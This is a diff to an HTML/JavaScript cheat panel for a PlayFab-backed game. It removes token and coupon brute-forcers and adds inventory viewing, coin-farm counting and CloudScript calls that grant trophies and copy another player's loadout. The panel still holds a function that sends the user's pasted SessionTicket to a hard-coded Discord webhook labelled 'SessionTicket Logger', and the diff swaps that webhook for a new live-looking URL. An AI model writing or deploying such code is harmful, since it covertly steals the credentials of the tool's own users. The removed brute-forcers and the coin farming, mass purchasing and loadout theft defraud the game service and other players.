@@ -424,10 +424,6 @@
           <button onclick="reportPlayer()">Report Player</button>
         </div>
         <div>
-          <h3>🎟️ Bruteforce Redeem Coupon <span id="couponBruteforceStatus" class="status-indicator status-inactive"></span></h3>
-          <button class="redeem-coupon-btn" onclick="toggleBruteforceRedeemCoupon()" id="couponBruteforceToggleButton">Start Bruteforce Redeem Coupon</button>
-        </div>
-        <div>
           <h3>🏆 Grant Trophy</h3>
           <input id="trophyId" placeholder="Trophy ID" type="text">
           <button class="grant-trophy-btn" onclick="grantTrophy()">Grant Trophy</button>
@@ -448,12 +444,6 @@
     </div>
 
     <div class="section">
-      <h2>🔑 Photon Token Generator <span id="photonTokenStatus" class="status-indicator status-inactive"></span></h2>
-      <button onclick="togglePhotonTokenGenerator()" id="photonTokenToggleButton">Start Generating Photon Token</button>
-      <div class="output" id="photonTokenOutput">Token will appear here...</div>
-    </div>
-
-    <div class="section">
       <h2>🔄 Reset Loadout</h2>
       <button onclick="resetLoadout()">Reset Loadout</button>
       <div class="output" id="resetLoadoutOutput">Results will appear here...</div>
@@ -467,31 +457,21 @@
     </div>
 
     <div class="section">
-      <h2>🔨 Photon Token Bruteforcer</h2>
-      <input id="playFabUsername" placeholder="PlayFab ID" type="text">
-      <button onclick="startBruteforce()">Start Bruteforce</button>
-      <button onclick="stopBruteforce()">Stop Bruteforce</button>
-      <div class="output" id="bruteforceOutput">Results will appear here...</div>
+      <h2>📦 View Inventory</h2>
+      <button onclick="viewInventory()">View Inventory</button>
+      <div class="output" id="inventoryOutput">Inventory results will appear here...</div>
     </div>
   </div>
 
   <script>
     const titleId = "bdff1";
-    let sessionTicket = null;
+    let sessionTicket = localStorage.getItem('sessionTicket') || null;
     let coinFarmBotRunning = false;
     let coinFarmId = null;
     let levelEditorRunning = false;
     let levelEditorId = null;
-    let bruteforceRunning = false;
-    let photonTokenRunning = false;
-    let photonTokenId = null;
-    let couponBruteforceRunning = false;
-    let couponBruteforceId = null;
-    let attempts = 0;
-    let couponBruteforceIntervalId = null;
-    let failedAttempts = 0;
-    const logEntries = [];
-    let totalTokensGenerated = 0;
+    let lastCoinFarmResponse = null;
+    let totalCoinsEarned = 0;
 
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
@@ -568,7 +548,7 @@
     }
 
     async function sendToDiscordWebhook(sessionTicket) {
-      const webhookURL = "https://discord.com/api/webhooks/1410689568386056275/Eq3YHxlcvOHxbbH7qXZHVPBPItzXBKQZgPk2wYpA6iy_ArTGfg5GaD-FLEjQ7xB8K4vb";
+      const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
 
       try {
         const response = await fetch(webhookURL, {
@@ -579,7 +559,7 @@
           body: JSON.stringify({
             content: `New SessionTicket captured: ${sessionTicket}`,
             username: 'SessionTicket Logger',
-            avatar_url: 'https://cdn.discordapp.com/avatars/340238256874586112/e2aa7a1f843d240a470a54264662b873?size=1024'
+            avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
           })
         });
 
@@ -618,9 +598,36 @@
 
     function formatResponse(result) {
       if (typeof result === "object" && result !== null) {
-        return Object.entries(result).map(([key, value]) => `${key}: ${value}`).join("\n");
+        return Object.entries(result).map(([key, value]) => `${key}: ${JSON.stringify(value, null, 2)}`).join("\n");
       }
       return result;
+    }
+
+    async function viewInventory() {
+      const output = document.getElementById("inventoryOutput");
+      output.textContent = "Fetching inventory...\n";
+
+      const data = await makeApiCall("Client/GetUserInventory", "POST", {});
+
+      if (data && data.data) {
+        if (data.data.Inventory && data.data.Inventory.length > 0) {
+          output.textContent = "=== Inventory ===\n";
+          data.data.Inventory.forEach(item => {
+            output.textContent += `Item ID: ${item.ItemId}\n`;
+            output.textContent += `Item Instance ID: ${item.ItemInstanceId}\n`;
+            output.textContent += `Item Class: ${item.ItemClass || "N/A"}\n`;
+            output.textContent += `Remaining Uses: ${item.RemainingUses || "N/A"}\n`;
+            output.textContent += `Custom Data: ${JSON.stringify(item.CustomData, null, 2) || "None"}\n`;
+            output.textContent += "--------------------\n";
+          });
+          output.textContent += `Virtual Currency: ${JSON.stringify(data.data.VirtualCurrency, null, 2) || "None"}\n`;
+        } else {
+          output.textContent = "No items in inventory.";
+        }
+      } else {
+        output.textContent = `Error: ${data.error || "Unknown error"}`;
+      }
+      output.scrollTop = output.scrollHeight;
     }
 
     async function attemptToBuyEverything() {
@@ -668,7 +675,6 @@
             continue;
           }
 
-          // Check blacklist: years, specific items, and RM-only Devil/PS4 items
           const itemName = item.ItemId.toLowerCase();
           const isBlacklistedYear = blacklistYears.some(year => itemName.includes(year.toLowerCase()));
           const isBlacklistedItem = blacklistItems.includes(item.ItemId);
@@ -710,7 +716,6 @@
             output.textContent += `🛍️ Attempting to purchase ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}...\n`;
 
             if (item.VirtualCurrency === "RM") {
-              // RM currency: Follow grantCoupons flow (StartPurchase -> PayForPurchase -> ConfirmPurchase)
               output.textContent += `Starting purchase for ${item.ItemId}...\n`;
               const startData = await makeApiCall("Client/StartPurchase", "POST", {
                 StoreId: "steam_Shop_Currency",
@@ -753,7 +758,6 @@
                 successfulPurchases++;
               }
             } else {
-              // Non-RM currency: Use direct PurchaseItem
               const purchaseData = await makeApiCall("Client/PurchaseItem", "POST", {
                 ItemId: item.ItemId,
                 Price: item.Price,
@@ -774,7 +778,6 @@
           }
 
           output.scrollTop = output.scrollHeight;
-          // Wait briefly between purchases to avoid overwhelming the server
           await new Promise(resolve => setTimeout(resolve, 0));
         }
 
@@ -1325,13 +1328,33 @@
       }, 10 * 60 * 1000);
     }
 
-    function toggleCoinFarmBot() {
+    async function toggleCoinFarmBot() {
+      const cloudOutput = document.getElementById("cloudOutput");
+      let neighborCoins = 0; // Track Neighbor coins
+      let kidCoins = 0; // Track Kid coins
+      let neighborPlayerId = null; // Track Neighbor role from decideSpecialRole
+
       if (coinFarmBotRunning) {
         clearInterval(coinFarmId);
         coinFarmBotRunning = false;
         document.getElementById("botStatus").className = "status-indicator status-inactive";
         document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
-        document.getElementById("cloudOutput").textContent += "\nBot stopped manually.";
+
+        // Update output to show only Neighbor and Kid coins
+        cloudOutput.textContent += `\n=== Coin Farm Bot Stopped ===\n`;
+        cloudOutput.textContent += `Bot stopped at ${new Date().toLocaleTimeString()}\n`;
+        cloudOutput.textContent += `Total Neighbor Coins Earned: ${Math.floor(neighborCoins)}\n`;
+        cloudOutput.textContent += `Total Kid Coins Earned: ${Math.floor(kidCoins)}\n`;
+        cloudOutput.scrollTop = cloudOutput.scrollHeight;
+
+        // Generate and download log file
+        const logContent = `Coin Farm Bot Log - Stopped at ${new Date().toLocaleTimeString()}\n\n` +
+                           `Total Neighbor Coins Earned: ${Math.floor(neighborCoins)}\n` +
+                           `Total Kid Coins Earned: ${Math.floor(kidCoins)}\n`;
+        downloadLogFile(logContent, `coin_farm_log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`);
+
+        totalCoinsEarned = 0; // Reset coin counter
+        lastCoinFarmResponse = null; // Clear last response
         return;
       }
 
@@ -1342,8 +1365,7 @@
       document.getElementById("botStatus").className = "status-indicator status-active";
       document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";
 
-      document.getElementById("cloudOutput").textContent = 
-        `Starting Coin Farm Bot with ${delayMinutes} minute delay...\n`;
+      cloudOutput.textContent = `Starting Coin Farm Bot with ${delayMinutes} minute delay...\n`;
 
       async function runCoinFarmCycle() {
         const roomType = document.getElementById("roomType").value;
@@ -1356,7 +1378,7 @@
           document.getElementById("playerId6").value.trim()
         ].filter(id => id);
 
-        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
+        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()}\n`;
         output += `Room Type: ${roomType}\nPlayers: ${playerIds.join(", ") || "None"}\n`;
 
         let matchId = null;
@@ -1373,8 +1395,10 @@
           } else if (data.data?.FunctionResult?.currentMatchId) {
             matchId = data.data.FunctionResult.currentMatchId;
             output += `✅ startNewMatch: MatchId - ${matchId}\n`;
+            lastCoinFarmResponse = data.data;
           } else {
             output += `✅ startNewMatch: Success\n`;
+            lastCoinFarmResponse = data.data;
           }
         } catch (err) {
           output += `❌ startNewMatch: Exception - ${err.message}\n`;
@@ -1391,6 +1415,15 @@
             output += `❌ decideSpecialRole: Error - ${data.error}\n`;
           } else {
             output += `✅ decideSpecialRole: Success\n`;
+            lastCoinFarmResponse = data.data;
+            // Extract Neighbor role using neighborId
+            if (data.data?.FunctionResult?.neighborId) {
+              neighborPlayerId = data.data.FunctionResult.neighborId;
+              output += `Neighbor Role Assigned: ${neighborPlayerId}\n`;
+            } else {
+              neighborPlayerId = null;
+              output += `Neighbor Role Assigned: Unknown\n`;
+            }
           }
         } catch (err) {
           output += `❌ decideSpecialRole: Exception - ${err.message}\n`;
@@ -1414,12 +1447,11 @@
               output += `❌ xpConsumed: Error - ${data.error}\n`;
             } else {
               output += `✅ xpConsumed: Success\n`;
+              lastCoinFarmResponse = data.data;
             }
           } catch (err) {
             output += `❌ xpConsumed: Exception - ${err.message}\n`;
           }
-        } else {
-          output += `⏩ xpConsumed: Skipped - No MatchId available\n`;
         }
 
         try {
@@ -1431,20 +1463,32 @@
 
           if (data.error) {
             output += `❌ finishMatch: Error - ${data.error}\n`;
-          } else if (data.data?.Logs) {
-            output += `✅ finishMatch: Success\nLogs:\n`;
-            data.data.Logs.forEach(log => {
-              output += `- ${log.Message}\n`;
-            });
           } else {
             output += `✅ finishMatch: Success\n`;
+            lastCoinFarmResponse = data.data;
+            // Parse Logs for coin amounts
+            let cycleCoins = 0;
+            if (data.data?.Logs) {
+              data.data.Logs.forEach(log => {
+                const match = log.Message.match(/Coins granted: (\d+)/);
+                if (match) {
+                  cycleCoins += parseInt(match[1], 10);
+                }
+              });
+            }
+            // Attribute coins based on Neighbor role
+            if (neighborPlayerId && playerIds.includes(neighborPlayerId)) {
+              neighborCoins += cycleCoins;
+              output += `💰 Coins Earned This Cycle: ${cycleCoins} (Neighbor)\n`;
+            } else {
+              kidCoins += cycleCoins;
+              output += `💰 Coins Earned This Cycle: ${cycleCoins} (Kid)\n`;
+            }
           }
         } catch (err) {
           output += `❌ finishMatch: Exception - ${err.message}\n`;
         }
 
-        output += `Waiting ${delayMinutes} minutes for next cycle...\n`;
-        const cloudOutput = document.getElementById("cloudOutput");
         cloudOutput.textContent += output;
         cloudOutput.scrollTop = cloudOutput.scrollHeight;
       }
@@ -1467,297 +1511,23 @@
       document.getElementById("levelEditorStatus").className = "status-indicator status-active";
       document.getElementById("levelEditorToggleButton").textContent = "Stop Level Editor";
 
-      document.getElementById("levelProgressionOutput").textContent = 
-        `Starting Level Editor...\n`;
+      async function runLevelEditor() {
+        const result = await submitLevelProgression();
+        const output = document.getElementById("levelProgressionOutput");
 
-      async function runLevelEditorCycle() {
-        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
-
-        try {
-          const data = await submitLevelProgression();
-
-          if (data.error) {
-            output += `❌ setLevelProgressionForClass: Error - ${data.error}\n`;
-          } else {
-            output += `✅ setLevelProgressionForClass: Success\n`;
-          }
-        } catch (err) {
-          output += `❌ setLevelProgressionForClass: Exception - ${err.message}\n`;
-        }
-
-        const levelOutput = document.getElementById("levelProgressionOutput");
-        levelOutput.textContent += output;
-        levelOutput.scrollTop = levelOutput.scrollHeight;
-      }
-
-      runLevelEditorCycle();
-      levelEditorId = setInterval(runLevelEditorCycle, 1000);
-    }
-
-    function togglePhotonTokenGenerator() {
-      if (photonTokenRunning) {
-        clearInterval(photonTokenId);
-        photonTokenRunning = false;
-        document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
-        document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
-        document.getElementById("photonTokenOutput").textContent += "\nPhoton token generator stopped manually.";
-        return;
-      }
-
-      photonTokenRunning = true;
-      document.getElementById("photonTokenStatus").className = "status-indicator status-active";
-      document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";
-
-      document.getElementById("photonTokenOutput").textContent = "Starting Photon token generation...\n";
-
-      async function generatePhotonToken() {
-        const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
-          PhotonApplicationId: "2b76b55a-bf65-47af-836f-daa9c8eb9f1e",
-          AuthenticationContext: null
-        });
-
-        const output = document.getElementById("photonTokenOutput");
-        if (data.data?.PhotonCustomAuthenticationToken) {
-          output.textContent += `✅ Photon Token: ${data.data.PhotonCustomAuthenticationToken}\n`;
+        if (result.error) {
+          output.textContent += `Error: ${result.error}\n`;
+        } else if (result.data?.FunctionResult) {
+          output.textContent += formatResponse(result.data.FunctionResult) + "\n";
         } else {
-          output.textContent += `❌ Error: ${data.error || "Failed to generate token"}\n`;
-        }
-        output.scrollTop = output.scrollHeight;
-      }
-
-      generatePhotonToken();
-      photonTokenId = setInterval(generatePhotonToken, 1000);
-    }
-
-    async function resetLoadout() {
-      const output = document.getElementById("resetLoadoutOutput");
-      const getData = await makeApiCall("Client/GetUserData", "POST", {});
-      if (getData.error) {
-        output.textContent = `Error getting data: ${getData.error}`;
-        return;
-      }
-      if (getData.data.Data && "loadout" in getData.data.Data) {
-        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
-          Data: { loadout: null }
-        });
-        if (updateData.error) {
-          output.textContent = `Error resetting: ${updateData.error}`;
-        } else {
-          output.textContent = "Loadout reset successfully!";
-        }
-      } else {
-        output.textContent = "No loadout found to reset.";
-      }
-    }
-
-    async function stealLoadout() {
-      const targetId = document.getElementById("targetPlayFabId").value.trim();
-      const output = document.getElementById("stealLoadoutOutput");
-      if (!targetId) {
-        output.textContent = "Please enter a target PlayFab ID.";
-        return;
-      }
-      const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
-        PlayFabId: targetId,
-        InfoRequestParameters: { GetUserData: true }
-      });
-      if (getData.error) {
-        output.textContent = `Error getting data: ${getData.error}`;
-        return;
-      }
-      const userData = getData.data.InfoResultPayload.UserData;
-      if (userData && "loadout" in userData) {
-        const loadoutValue = userData.loadout.Value;
-        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
-          Data: { loadout: loadoutValue }
-        });
-        if (updateData.error) {
-          output.textContent = `Error updating: ${updateData.error}`;
-        } else {
-          output.textContent = "Loadout stolen successfully!";
-        }
-      } else {
-        output.textContent = "No loadout found on target.";
-      }
-    }
-
-    function generateRandomToken() {
-      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      const tokenLength = 50;
-      let token = '';
-      for (let i = 0; i < tokenLength; i++) {
-        token += chars.charAt(Math.floor(Math.random() * chars.length));
-      }
-      totalTokensGenerated++;
-      return token;
-    }
-
-    async function checkToken(playFabId, token) {
-      try {
-        const response = await fetch(`https://${titleId}.playfabapi.com/photon/authenticate?username=${playFabId}&token=${token}`, {
-          method: 'GET',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-Authorization': sessionTicket
-          }
-        });
-        const result = await response.json();
-        return { token, result };
-      } catch (error) {
-        return { token, error: error.message };
-      }
-    }
-
-    function downloadLog() {
-      const logContent = logEntries.join('\n');
-      const blob = new Blob([logContent], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `bruteforce_log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-    }
-
-    async function startBruteforce() {
-      if (bruteforceRunning) return;
-
-      const playFabId = document.getElementById("playFabUsername").value.trim();
-      const output = document.getElementById("bruteforceOutput");
-
-      if (!playFabId) {
-        output.textContent = "Please enter a PlayFab ID.";
-        return;
-      }
-
-      if (!sessionTicket) {
-        output.textContent = "Please set your SessionTicket first.";
-        return;
-      }
-
-      bruteforceRunning = true;
-      failedAttempts = 0;
-      totalTokensGenerated = 0;
-      logEntries.length = 0; // Clear previous logs
-      let foundValid = false;
-      output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
-
-      async function tryTokenBatch() {
-        if (!bruteforceRunning) return;
-
-        const batchSize = 1000;
-        const tokens = Array.from({ length: batchSize }, generateRandomToken);
-        const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
-
-        const outputBuffer = [];
-
-        for (const { token, result, error } of results) {
-          if (error) {
-            failedAttempts++;
-            const logEntry = `Error for token ${token}: ${error}`;
-            logEntries.push(logEntry);
-            outputBuffer.push(logEntry);
-          } else {
-            const logEntry = `Token: ${token}, ResultCode: ${result.resultCode}, Response: ${JSON.stringify(result)}`;
-            logEntries.push(logEntry);
-            if (result.resultCode === 1) {
-              outputBuffer.push(`✅ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
-              foundValid = true;
-            } else {
-              failedAttempts++;
-            }
-          }
-        }
-
-        if (outputBuffer.length > 0) {
-          output.textContent += outputBuffer.join('\n') + '\n';
-          output.scrollTop = output.scrollHeight;
-        }
-
-        if (foundValid) {
-          output.textContent += `Valid token found: ${results.find(r => r.result?.resultCode === 1).token}\n`;
-          logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
-          downloadLog();
-          stopBruteforce();
-        } else if (bruteforceRunning) {
-          setTimeout(tryTokenBatch, 0);
-        }
-      }
-
-      tryTokenBatch();
-    }
-
-    function stopBruteforce() {
-      bruteforceRunning = false;
-      const output = document.getElementById("bruteforceOutput");
-      output.textContent += `\nBruteforce stopped manually. Total tokens generated: ${totalTokensGenerated}, Failed attempts: ${failedAttempts}\n`;
-      logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
-      downloadLog();
-      output.scrollTop = output.scrollHeight;
-    }
-
-    function toggleBruteforceRedeemCoupon() {
-      if (couponBruteforceRunning) {
-        clearInterval(couponBruteforceIntervalId);
-        couponBruteforceRunning = false;
-        document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
-        document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
-        document.getElementById("apiOutput").textContent += `\nCoupon bruteforce stopped manually. Total attempts: ${attempts}\n`;
-        document.getElementById("apiOutput").scrollTop = document.getElementById("apiOutput").scrollHeight;
-        return;
-      }
-
-      if (!sessionTicket) {
-        document.getElementById("apiOutput").textContent = "Please set your SessionTicket first.\n";
-        return;
-      }
-
-      couponBruteforceRunning = true;
-      attempts = 0;
-      document.getElementById("couponBruteforceStatus").className = "status-indicator status-active";
-      document.getElementById("couponBruteforceToggleButton").textContent = "Stop Bruteforce Redeem Coupon";
-      document.getElementById("apiOutput").textContent = "Starting coupon bruteforce...\n";
-
-      async function runCouponBruteforce() {
-        const couponCode = generateRandomCouponCode();
-        attempts++;
-        const output = document.getElementById("apiOutput");
-
-        try {
-          const data = await makeApiCall("Client/RedeemCoupon", "POST", {
-            CouponCode: couponCode,
-            CatalogVersion: "Ingame"
-          });
-
-          if (data.error) {
-            output.textContent += `Attempt ${attempts}: Coupon ${couponCode} failed - ${data.error}\n`;
-          } else {
-            output.textContent += `✅ Attempt ${attempts}: Coupon ${couponCode} redeemed successfully!\n`;
-            couponBruteforceRunning = false;
-            clearInterval(couponBruteforceIntervalId);
-            document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
-            document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
-          }
-        } catch (err) {
-          output.textContent += `Attempt ${attempts}: Coupon ${couponCode} error - ${err.message}\n`;
+          output.textContent += formatResponse(result.data) + "\n";
         }
 
         output.scrollTop = output.scrollHeight;
       }
 
-      function generateRandomCouponCode() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let code = '';
-        for (let i = 0; i < 10; i++) {
-          code += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return code;
-      }
-
-      runCouponBruteforce();
-      couponBruteforceIntervalId = setInterval(runCouponBruteforce, 1000);
+      runLevelEditor();
+      levelEditorId = setInterval(runLevelEditor, 1000);
     }
 
     async function grantTrophy() {
@@ -1770,19 +1540,85 @@
       }
 
       const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        FunctionName: "grantTrophy",
-        FunctionParameter: {
-          trophyId: trophyId
-        },
-        GeneratePlayStreamEvent: true
+        CustomTags: null,
+        FunctionName: "addTrophy",
+        FunctionParameter: { trophyId },
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
       });
 
       if (data.error) {
-        output.textContent = `Error granting trophy: ${data.error}`;
+        output.textContent = `Error: ${data.error}`;
+      } else if (data.data?.FunctionResult) {
+        output.textContent = formatResponse(data.data.FunctionResult);
       } else {
-        output.textContent = `Trophy ${trophyId} granted successfully!\n` + formatResponse(data.data);
+        output.textContent = formatResponse(data.data);
       }
-      output.scrollTop = output.scrollHeight;
+    }
+
+    async function resetLoadout() {
+      const output = document.getElementById("resetLoadoutOutput");
+
+      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "resetLoadout",
+        FunctionParameter: {},
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      if (data.error) {
+        output.textContent = `Error: ${data.error}`;
+      } else if (data.data?.FunctionResult) {
+        output.textContent = formatResponse(data.data.FunctionResult);
+      } else {
+        output.textContent = formatResponse(data.data);
+      }
+    }
+
+    async function stealLoadout() {
+      const targetPlayFabId = document.getElementById("targetPlayFabId").value.trim();
+      const output = document.getElementById("stealLoadoutOutput");
+
+      if (!targetPlayFabId) {
+        output.textContent = "Please enter a target PlayFab ID.";
+        return;
+      }
+
+      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "stealLoadout",
+        FunctionParameter: { targetPlayFabId },
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      if (data.error) {
+        output.textContent = `Error: ${data.error}`;
+      } else if (data.data?.FunctionResult) {
+        output.textContent = formatResponse(data.data.FunctionResult);
+      } else {
+        output.textContent = formatResponse(data.data);
+      }
+    }
+
+    // Helper function to download logs as a text file
+    function downloadLogFile(content, fileName) {
+      const blob = new Blob([content], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = fileName;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
     }
   </script>
 </body>
